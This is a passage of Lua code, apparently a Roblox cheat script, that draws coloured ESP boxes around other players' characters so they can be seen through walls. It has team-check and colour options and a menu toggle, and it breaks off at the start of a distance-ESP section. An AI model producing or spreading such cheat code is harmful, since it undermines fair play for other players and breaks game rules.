    topFrame.Size = UDim2.new(1, 0, 0, 2)
    topFrame.Position = UDim2.new(0, 0, 0, 0)

    local bottomFrame = Instance.new("Frame", frame)
    bottomFrame.BorderSizePixel = 1
    bottomFrame.Size = UDim2.new(1, 0, 0, 2)
    bottomFrame.Position = UDim2.new(0, 0, 1, -2)

    local leftFrame = Instance.new("Frame", frame)
    leftFrame.BorderSizePixel = 1
    leftFrame.Size = UDim2.new(0, 2, 1, 0)
    leftFrame.Position = UDim2.new(0, 0, 0, 0)

    local rightFrame = Instance.new("Frame", frame)
    rightFrame.BorderSizePixel = 1
    rightFrame.Size = UDim2.new(0, 2, 1, 0)
    rightFrame.Position = UDim2.new(1, -2, 0, 0)

    -- Coroutine to update ESP boxes
    coroutine.wrap(function()
        while wait(0.1) do
            if playerCharacter and playerCharacter.Character and playerCharacter.Character:FindFirstChild("Humanoid") and (playerCharacter.Character.Humanoid.Health > 0) then
                billboardGui.Adornee = playerCharacter.Character.HumanoidRootPart

                if config.ESP.Box.Box then
                    frame.Visible = true
                else
                    frame.Visible = false
                end

                if config.ESP.Box.TeamCheck and (playerCharacter.TeamColor == Players.LocalPlayer.TeamColor) then
                    billboardGui.Enabled = false
                else
                    billboardGui.Enabled = isToggleOn
                end

                local color = config.ESP.Box.BoxColor
                if config.ESP.Box.TeamColor then
                    color = playerCharacter.TeamColor.Color
                end

                topFrame.BackgroundColor3 = color
                bottomFrame.BackgroundColor3 = color
                leftFrame.BackgroundColor3 = color
                rightFrame.BackgroundColor3 = color
                frame.BackgroundColor3 = color
            else
                billboardGui.Enabled = false
                billboardGui.Adornee = nil
                frame.Visible = false
            end

            if not Players:FindFirstChild(playerCharacter.Name) then
                billboardGui:Destroy()
                return
            end
        end
    end)()
end


EspsSection:addToggle({
    title = "Box ESP",  -- Title of the toggle
    default = false,    -- Default value (off)
    callback = function(value)
        isToggleOn = value
        -- Update all existing ESPs based on the new toggle state
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                local billboardGui = player.Character:FindFirstChild(player.Name .. "_BoxESP")
                if billboardGui then
                    billboardGui.Enabled = isToggleOn and (not config.ESP.Box.TeamCheck or player.TeamColor ~= Players.LocalPlayer.TeamColor)
                    billboardGui:FindFirstChild("Frame").Visible = isToggleOn
                end
            end
        end
    end
})


-- Connect player events
Players.PlayerAdded:Connect(function(playerCharacter)
    playerCharacter.CharacterAdded:Connect(function()
        createBoxESP(playerCharacter)
    end)
end)

-- Handle existing players
for _, playerCharacter in ipairs(Players:GetPlayers()) do
    if playerCharacter.Character then
        createBoxESP(playerCharacter)
    end
end














-- Dependencies
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- Get the local player and the camera
local localPlayer = Players.LocalPlayer
local currentCamera = Workspace.CurrentCamera

-- Variable to keep track of Distance ESP toggle state
local distanceESPEnabled = false

-- Container for BillboardGui objects
local distanceDisplays = {}

